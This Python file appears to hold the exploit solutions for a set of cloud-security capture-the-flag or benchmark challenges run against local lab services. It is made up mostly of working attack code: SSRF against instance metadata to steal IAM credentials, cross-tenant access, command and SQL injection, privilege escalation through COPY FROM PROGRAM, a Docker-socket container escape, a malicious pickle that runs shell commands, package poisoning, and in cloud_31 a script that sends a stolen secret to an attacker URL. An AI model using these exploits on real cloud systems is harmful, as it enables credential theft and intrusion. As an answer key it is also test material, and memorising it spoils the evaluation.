#!/usr/bin/env python3
"""Black-box exploit adapters for the first cloud migration slice."""

import json
import base64
import datetime
import os
import pickle
import re
import subprocess
import tempfile
import time
import urllib.parse

from runner import http, json_request, require_flag, wait_port


def cloud_01(base: str, flag: str) -> None:
    def fetch(url: str) -> str:
        response = http("GET", f"{base}/fetch?{urllib.parse.urlencode({'url': url})}")
        assert response.status == 200
        return response.body

    role = fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/").strip()
    assert "ec2-role" in role
    credential_response = fetch(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
    credentials = json.loads(credential_response.split("\n\n", 1)[1])
    response = http("GET", "http://127.0.0.1:10671/files/flag.txt", headers={
        "X-Access-Key-Id": credentials["AccessKeyId"],
        "X-Secret-Access-Key": credentials["SecretAccessKey"],
    })
    require_flag(response.body, flag)


def cloud_11(base: str, flag: str) -> None:
    buckets = json.loads(http("GET", base).body)["buckets"]
    assert "prod-assets-2024" in buckets
    response = http("GET", f"{base}/buckets/prod-assets-2024/flag.txt")
    require_flag(response.body, flag)


def cloud_20(base: str, flag: str) -> None:
    info = http("GET", f"{base}/volumes/ocid.vol.1001").json()
    assert info["owner"] == "victim-tenant"
    attached = json_request("POST", f"{base}/volumes/ocid.vol.1001/attach", {"instance_id": "ocid.instance.9001"})
    assert attached.status == 200
    require_flag(http("GET", f"{base}/volumes/ocid.vol.1001/data").body, flag)


def cloud_21(base: str, flag: str) -> None:
    token = json_request("POST", f"{base}/token", {"tenant": "tenant-a"}).json()["token"]
    response = http("GET", f"{base}/api/users?tenant=tenant-b", headers={"Authorization": f"Bearer {token}"})
    assert response.status == 200
    require_flag(response.body, flag)


def cloud_22(base: str, flag: str) -> None:
    response = json_request("POST", f"{base}/wsman/exec", {"cmd": "id; cat /root/flag.txt"})
    assert response.status == 200 and response.json()["user"] == "root"
    require_flag(response.body, flag)


def cloud_25(base: str, flag: str) -> None:
    result = http("GET", f"{base}/search?q=flag").json()
    resource = next(item for item in result["results"] if item["id"] == "s-001")
    response = http("GET", f"{base}/resources/{resource['id']}", headers={
        "X-Caller-ARN": "arn:aws:iam::111122223333:user/attacker"})
    require_flag(response.body, flag)


def cloud_27(base: str, flag: str) -> None:
    connections = http("GET", f"{base}/api/connections").json()["connections"]
    victim = next(item for item in connections if item["tenant"] == "tenant-b")
    require_flag(http("GET", f"{base}/api/connections/{victim['id']}").body, flag)


def cloud_28(base: str, flag: str) -> None:
    direct = http("GET", f"{base}/flag")
    assert direct.status == 403
    via_nat = json_request("POST", f"{base}/egress", {})
    require_flag(via_nat.body, flag)


def cloud_30(base: str, flag: str) -> None:
    code = "import os,urllib.request; r=urllib.request.Request(os.environ['VICTIM_URL'] + '/api/projects/victim/secrets', headers={'Authorization': 'Bearer ' + os.environ['DEFAULT_SA_TOKEN']}); print(urllib.request.urlopen(r).read().decode())"
    response = json_request("POST", f"{base}/deploy", {"code": code})
    assert response.status == 200
    require_flag(response.body, flag)


def cloud_03(base: str, flag: str) -> None:
    response = json_request("POST", f"{base}/invoke", {"code": "import os; print(os.environ['FLAG'])"})
    assert response.status == 200
    require_flag(response.body, flag)


def cloud_04(base: str, flag: str) -> None:
    template = "Resources:\n  Leak:\n    Properties:\n      Value: !Sub ${/secure/flag}\n"
    response = http("POST", f"{base}/parse", data=template.encode(), headers={"Content-Type": "text/plain"})
    assert response.status == 200
    require_flag(response.body, flag)


def cloud_05(base: str, flag: str) -> None:
    response = http("GET", f"{base}/secrets")
    assert response.status == 200
    require_flag(response.body, flag)


def cloud_12(base: str, flag: str) -> None:
    token = http("GET", f"{base}/auth/token").json()["token"]
    fwd = "fwd-8c1d4e5f-6a2b-4c3d-8e9f-000000000002"
    response = http("GET", f"{base}/notebook/{fwd}/exec?{urllib.parse.urlencode({'code': "print(open('/flag.txt').read())"})}",
                    headers={"Authorization": f"Bearer {token}"})
    require_flag(response.body, flag)


def cloud_15(base: str, flag: str) -> None:
    body = {"driver": "Redshift", "runtime_name": "AutoResolveIntegrationRuntime",
            "connection_string": "Driver={Redshift};LOGIN_URL={cat /app/memory.json;}"}
    response = json_request("POST", f"{base}/pipeline", body)
    assert response.status == 200
    require_flag(response.body, flag)


def cloud_23(base: str, flag: str) -> None:
    wait_port(10723)
    wait_port(10724)
    leaked = "arn:aws:iam::111122223333:user/attacker/leaked-key"
    response = http("GET", f"{base}/api/unsupported", headers={"X-Caller-ARN": leaked})
    assert response.status == 403 and leaked in response.body
    wordlist = ["AdminRole", "SecretRole", "DataPipelineRole", "NonexistentRole", "BackupRole"]
    found = []
    for name in wordlist:
        hit = json_request("POST", "http://127.0.0.1:10723/assume-role", {"role_name": name})
        assert hit.status == 403
        if "resource: arn:aws:iam::444455556666:role/" in hit.body:
            found.append(name)
    assert set(found) == {"AdminRole", "SecretRole", "DataPipelineRole"}
    logs = http("GET", "http://127.0.0.1:10724/logs").json()
    assert logs["count"] == 0
    require_flag(logs.get("flag", ""), flag)


def cloud_24(base: str, flag: str) -> None:
    response = http("POST", f"{base}/portfolios", data=json.dumps({"name": "attacker", "include_flag": True}).encode(),
                    headers={"Content-Type": "application/json", "X-Api-Key": "valid-sigv4"})
    assert response.status == 200
    pid = response.json()["portfolio_id"]
    require_flag(http("GET", f"{base}/portfolios/{pid}", headers={"X-Api-Key": "valid-sigv4"}).body, flag)


def cloud_29(base: str, flag: str) -> None:
    response = json_request("POST", f"{base}/workflows", {
        "workspace": "tenant-a", "dataset_ref": "../tenant-b/secret.txt"})
    assert response.status == 200
    require_flag(response.body, flag)


def cloud_13(base: str, flags: list[str]) -> None:
    assert json_request("POST", f"{base}/sql", {"sql": "CREATE SERVER log_server FOREIGN DATA WRAPPER file_fdw"}).status == 200
    assert json_request("POST", f"{base}/sql", {"sql": "CREATE FOREIGN TABLE demo (t text) SERVER log_server OPTIONS (filename '/rdsdbdata/config/grover_volume.conf')"}).status == 200
    require_flag(json_request("POST", f"{base}/sql", {"sql": "SELECT * FROM demo"}).body, flags[0])
    response = http("GET", f"{base}/fetch?{urllib.parse.urlencode({'url': 'http://internal-api:5000/api', 'auth': 'grover-internal-credential-token'})}")
    require_flag(response.body, flags[1])


def cloud_14(base: str, flag: str) -> None:
    sql = lambda text: json_request("POST", f"{base}/sql", {"sql": text})
    assert sql("CREATE TABLE temp_table (data text)").status == 200
    assert sql("INSERT INTO temp_table VALUES ('dummy')").status == 200
    assert sql("CREATE FUNCTION suid(text) RETURNS text IMMUTABLE AS 'SELECT ''nothing''' LANGUAGE sql").status == 200
    assert sql("CREATE INDEX idx_malicious ON temp_table (suid(data))").status == 200
    assert sql("ALTER TABLE temp_table OWNER TO cloudsqladmin").status == 200
    assert sql("CREATE OR REPLACE FUNCTION suid(text) RETURNS text VOLATILE AS $$ COPY public.shell_commands_results (data) FROM PROGRAM 'cat /host_flag.txt'; SELECT 'done' $$ LANGUAGE sql").status == 200
    assert sql("ANALYZE public.temp_table").status == 200
    require_flag(sql("SELECT * FROM shell_commands_results").body, flag)


def cloud_07(base: str, flag: str) -> None:
    orgs = http("GET", "http://127.0.0.1:10703/orgs").json()
    assert "demo-org" in orgs["organizations"]
    token = json_request("POST", "http://127.0.0.1:10703/token", {
        "sub": "repo:demo-org/demo-repo:ref:refs/heads/main", "aud": "sts.amazonaws.com"}).json()["access_token"]
    values = urllib.parse.urlencode({"Action": "AssumeRoleWithWebIdentity",
        "RoleArn": "arn:aws:iam::000000000000:role/GitHubActionsRole",
        "WebIdentityToken": token, "RoleSessionName": "blackbox", "Version": "2011-06-15"}).encode()
    response = http("POST", "http://127.0.0.1:10707/", data=values,
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
    assert response.status == 200
    require_flag(response.body, flag)


def cloud_08(base: str, flag: str) -> None:
    roles = http("GET", base + "/roles").json()["roles"]
    assert any(item["name"] == "CrossAccountRole" for item in roles)
    values = urllib.parse.urlencode({"Action": "AssumeRole",
        "RoleArn": "arn:aws:iam::111111111111:role/CrossAccountRole",
        "RoleSessionName": "blackbox", "AccessKeyId": "AKIAATTACKEREXAMPLE",
        "SecretAccessKey": "attacker-secret-key"}).encode()
    response = http("POST", base + "/", data=values,
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
    assert response.status == 200
    access_key = re.search(r"<AccessKeyId>([^<]+)", response.body).group(1)
    secret = re.search(r"<SecretAccessKey>([^<]+)", response.body).group(1)
    token = re.search(r"<SessionToken>([^<]+)", response.body).group(1)
    result = http("GET", "http://127.0.0.1:10708/flag.txt", headers={
        "X-Access-Key-Id": access_key, "X-Secret-Access-Key": secret, "X-Session-Token": token})
    require_flag(result.body, flag)


def cloud_09(base: str, flag: str) -> None:
    key = http("GET", base + "/backup/private.pem").body
    assert "BEGIN" in key
    token = json_request("POST", base + "/sign", {"claims": {
        "sub": "admin@corp", "aud": "https://signin.aws.amazon.com/saml"}}).json()["access_token"]
    values = urllib.parse.urlencode({"Action": "AssumeRoleWithSAML",
        "RoleArn": "arn:aws:iam::000000000000:role/SAMLAdminRole",
        "SAMLAssertion": token, "RoleSessionName": "blackbox"}).encode()
    response = http("POST", "http://127.0.0.1:10709/", data=values,
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
    assert response.status == 200
    require_flag(response.body, flag)


def cloud_10(base: str, flag: str) -> None:
    common = {"Action": "AssumeRole", "RoleArn": "arn:aws:iam::000000000000:role/AdminRole",
              "RoleSessionName": "blackbox", "AccessKeyId": "AKIASCBPASSEXAMPLE",
              "SecretAccessKey": "scp-bypass-secret"}
    blocked = http("POST", base + "/", data=urllib.parse.urlencode(common).encode(),
                   headers={"Content-Type": "application/x-www-form-urlencoded"})
    assert blocked.status != 200 and "AccessDenied" in blocked.body
    common["Version"] = "2010-05-08"
    response = http("POST", base + "/", data=urllib.parse.urlencode(common).encode(),
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
    assert response.status == 200
    require_flag(response.body, flag)


def cloud_16(base: str, flag: str) -> None:
    cert = json_request("POST", "http://127.0.0.1:10716/sign", {
        "cn": "replication.eee03a2acfe6.database.azure.com.attacker.example"}).json()
    with tempfile.TemporaryDirectory() as directory:
        cert_path, key_path = os.path.join(directory, "client.crt"), os.path.join(directory, "client.key")
        with open(cert_path, "wb") as f:
            f.write(base64.b64decode(cert["cert"]))
        with open(key_path, "wb") as f:
            f.write(base64.b64decode(cert["key"]))
        os.chmod(key_path, 0o600)
        result = subprocess.run(["pg_basebackup", "-h", "127.0.0.1", "-p", "10627", "-U", "replication",
            "-d", "dbname=postgres", "-D", os.path.join(directory, "backup"), "-X", "none", "--no-password"],
            env={**os.environ, "PGSSLMODE": "require", "PGSSLCERT": cert_path, "PGSSLKEY": key_path},
            capture_output=True, text=True, timeout=90)
        assert result.returncode == 0, result.stderr
        found = subprocess.run(["grep", "-rao", r"flag{[^}]*}", os.path.join(directory, "backup")],
                               capture_output=True, text=True).stdout
        require_flag(found, flag)


def cloud_17(base: str, flags: list[str]) -> None:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding, rsa
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.x509.oid import NameOID
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "LinuxTransport")])
    cert = x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key()).serial_number(
        x509.random_serial_number()).not_valid_before(datetime.datetime.utcnow()).not_valid_after(
        datetime.datetime.utcnow() + datetime.timedelta(days=1)).sign(key, hashes.SHA256())
    envelope = http("GET", base + "/certs", headers={
        "x-ms-guest-agent-public-x509-cert": base64.b64encode(cert.public_bytes(serialization.Encoding.PEM)).decode()}).json()
    session = key.decrypt(base64.b64decode(envelope["wrapped_key"]), padding.OAEP(
        mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
    decryptor = Cipher(algorithms.AES(session), modes.GCM(base64.b64decode(envelope["iv"]))).decryptor()
    bundle = json.loads((decryptor.update(base64.b64decode(envelope["ciphertext"])) + decryptor.finalize_with_tag(
        base64.b64decode(envelope["tag"]))).decode())
    tenant_key = serialization.load_pem_private_key(bundle["tenantEncryptionCertPem"].encode(), password=None)
    settings = http("GET", base + "/vmSettings").json()["extensions"][0]["protectedSettings"]
    session = tenant_key.decrypt(base64.b64decode(settings["wrapped_key"]), padding.OAEP(
        mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
    decryptor = Cipher(algorithms.AES(session), modes.GCM(base64.b64decode(settings["iv"]))).decryptor()
    plain = decryptor.update(base64.b64decode(settings["ciphertext"])) + decryptor.finalize_with_tag(
        base64.b64decode(settings["tag"]))
    require_flag(plain.decode(), flags[0])
    token = next(line.split("=", 1)[1] for line in plain.decode().splitlines() if line.startswith("TLS_BOOTSTRAP_TOKEN"))
    csr_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "system:node:blackbox"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "system:nodes")])).sign(csr_key, hashes.SHA256())
    signed = json_request("POST", "http://127.0.0.1:10722/sign", {"token": token,
        "csr": base64.b64encode(csr.public_bytes(serialization.Encoding.PEM)).decode()}).json()
    result = http("GET", "http://127.0.0.1:10722/node-secrets", headers={"X-Node-Cert": signed["cert"]})
    require_flag(result.body, flags[1])


def cloud_31(base: str, flag: str) -> None:
    script = (
        "python3 - <<'PY'\n"
        "import json, os, urllib.parse, urllib.request\n"
        "vault = os.environ['VAULT_URL']; token = os.environ['VAULT_TOKEN']\n"
        "req = urllib.request.Request(vault + '/credentials', headers={'X-Vault-Token': token})\n"
        "secret = json.load(urllib.request.urlopen(req))['secret']\n"
        "req2 = urllib.request.Request(os.environ['VICTIM_URL'] + '/flag', headers={'Authorization': 'Bearer ' + secret})\n"
        "flag = json.load(urllib.request.urlopen(req2))['flag']\n"
        "urllib.request.urlopen(os.environ['ATTACKER_URL'] + '/collect?flag=' + urllib.parse.quote(flag))\n"
        "PY"
    )
    assert json_request("POST", base + "/runbooks", {"script": script,
        "attacker_url": "http://automation-service:5000"}).status == 200
    assert http("POST", base + "/rotate").status == 200
    deadline = time.monotonic() + 30
    while True:
        body = http("GET", base + "/collections").body
        if flag in body:
            return
        if time.monotonic() > deadline:
            raise AssertionError(f"cloud-31 flag not collected within 30s: {body}")
        time.sleep(1)


def cloud_06(base: str, flag: str) -> None:
    code = """import json,socket
def call(method,path,body=None):
    s=socket.socket(socket.AF_UNIX)
    s.connect("/var/run/docker.sock")
    data=b"" if body is None else json.dumps(body).encode()
    req=(method+" "+path+" HTTP/1.1\\r\\nHost: docker\\r\\nContent-Type: application/json\\r\\nContent-Length: "+str(len(data))+"\\r\\nConnection: close\\r\\n\\r\\n").encode()+data
    s.sendall(req)
    head=b""
    while b"\\r\\n\\r\\n" not in head:
        chunk=s.recv(4096)
        if not chunk:
            break
        head+=chunk
    first,_,rest=head.partition(b"\\r\\n\\r\\n")
    clen=0
    for line in first.split(b"\\r\\n"):
        if line.lower().startswith(b"content-length:"):
            clen=int(line.split(b":",1)[1].strip())
    if clen:
        while len(rest)<clen:
            chunk=s.recv(65536)
            if not chunk:
                break
            rest+=chunk
        rest=rest[:clen]
    else:
        while True:
            chunk=s.recv(65536)
            if not chunk:
                break
            rest+=chunk
    s.close()
    return int(first.split(b" ")[1]), rest.decode()
cfg={"Image":"python:3.11-slim","Cmd":["cat","/mnt/flag/flag.txt"],"HostConfig":{"Binds":["/tmp/cloud-06-flag:/mnt/flag:ro"]}}
status,body=call("POST","/containers/create",cfg)
if status!=201:
    raise SystemExit(body)
cid=json.loads(body)["Id"]
call("POST","/containers/"+cid+"/start")
call("POST","/containers/"+cid+"/wait")
status,logs=call("GET","/containers/"+cid+"/logs?stdout=1&stderr=1")
call("DELETE","/containers/"+cid+"?force=1")
print(logs)
"""
    response = http("POST", f"{base}/step2", data=urllib.parse.urlencode({"code": code}).encode(),
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
    require_flag(response.body, flag)


def cloud_18(base: str, flag: str) -> None:
    wait_port(10718)
    wait_port(10719)
    build = json_request("POST", f"{base}/build", {"dockerfile": "FROM scratch\nRUN echo BUILD_SECRET=$BUILD_SECRET"})
    assert build.status == 200 and "build-fleet-internal-secret" in build.body
    script = "cat /flag.txt"
    assert http("PUT", "http://127.0.0.1:10718/images/victim-app:latest", data=script.encode()).status == 201
    pulled = json_request("POST", "http://127.0.0.1:10719/pull", {})
    require_flag(pulled.body, flag)


def cloud_19(base: str, flag: str) -> None:
    wait_port(10720)
    wait_port(10721)

    def build(command: str) -> bytes:
        class Payload:
            def __reduce__(self):
                return (subprocess.check_output, (["/bin/sh", "-c", command],))
        return pickle.dumps(Payload())

    def run_model(command: str) -> str:
        payload = {"name": "gpt2-malicious", "content": base64.b64encode(build(command)).decode()}
        uploaded = json_request("POST", base + "/models", payload)
        assert uploaded.status == 200
        assert "dangerous pickle detected" in uploaded.json().get("scan", "")
        inferred = json_request("POST", "http://127.0.0.1:10720/infer",
                                {"model_id": uploaded.json()["model_id"]})
        assert inferred.status == 200
        return inferred.json().get("result", "")

    role = run_model("python3 -c \"import urllib.request;print(urllib.request.urlopen("
                     "'http://node-imds:5000/latest/meta-data/iam/security-credentials/').read().decode())\"")
    assert "eks-node-role" in role
    creds = run_model("python3 -c \"import urllib.request;print(urllib.request.urlopen("
                      "'http://node-imds:5000/latest/meta-data/iam/security-credentials/eks-node-role').read().decode())\"")
    token = re.search(r'"Token":\s*"([^"]+)"', creds).group(1)
    secrets = http("GET", "http://127.0.0.1:10721/secrets",
                   headers={"Authorization": f"Bearer {token}"})
    require_flag(secrets.body, flag)


def cloud_26(base: str, flag: str) -> None:
    wait_port(10726)
    deadline = time.monotonic() + 30
    while True:
        try:
            if http("GET", "http://127.0.0.1:10726/", timeout=2).status < 500:
                break
        except AssertionError:
            pass
        if time.monotonic() > deadline:
            raise AssertionError("pkg-registry on 10726 did not become ready")
        time.sleep(1)
    package = "python3 -c \"import os,urllib.request; r=urllib.request.Request(os.environ['RESOURCE_URL']+'/api/projects/tenant-b/secrets', headers={'X-Worker-Token':os.environ['WORKER_TOKEN']}); print(urllib.request.urlopen(r).read().decode())\""
    assert http("PUT", "http://127.0.0.1:10726/packages/data-platform-utils/1.0.0", data=package.encode()).status == 201
    response = json_request("POST", f"{base}/resolve", {"package": "data-platform-utils", "version": "1.0.0"})
    require_flag(response.body, flag)


CASES = {
    "cloud-06": (10609, cloud_06), "cloud-18": (10629, cloud_18),
    "cloud-19": (10630, cloud_19), "cloud-26": (10637, cloud_26),
    "cloud-13": (10624, cloud_13),
    "cloud-14": (10625, cloud_14),
    "cloud-03": (10604, cloud_03), "cloud-04": (10605, cloud_04),
    "cloud-05": (10608, cloud_05), "cloud-12": (10623, cloud_12),
    "cloud-15": (10626, cloud_15), "cloud-23": (10634, cloud_23),
    "cloud-24": (10635, cloud_24), "cloud-29": (10640, cloud_29),
    "cloud-01": (10601, cloud_01), "cloud-11": (10621, cloud_11),
    "cloud-20": (10631, cloud_20), "cloud-21": (10632, cloud_21),
    "cloud-22": (10633, cloud_22), "cloud-25": (10636, cloud_25),
    "cloud-27": (10638, cloud_27), "cloud-28": (10639, cloud_28),
    "cloud-30": (10641, cloud_30),
    "cloud-07": (10611, cloud_07), "cloud-08": (10612, cloud_08),
    "cloud-09": (10613, cloud_09), "cloud-10": (10615, cloud_10),
    "cloud-16": (10627, cloud_16), "cloud-17": (10628, cloud_17),
    "cloud-31": (10642, cloud_31),
}
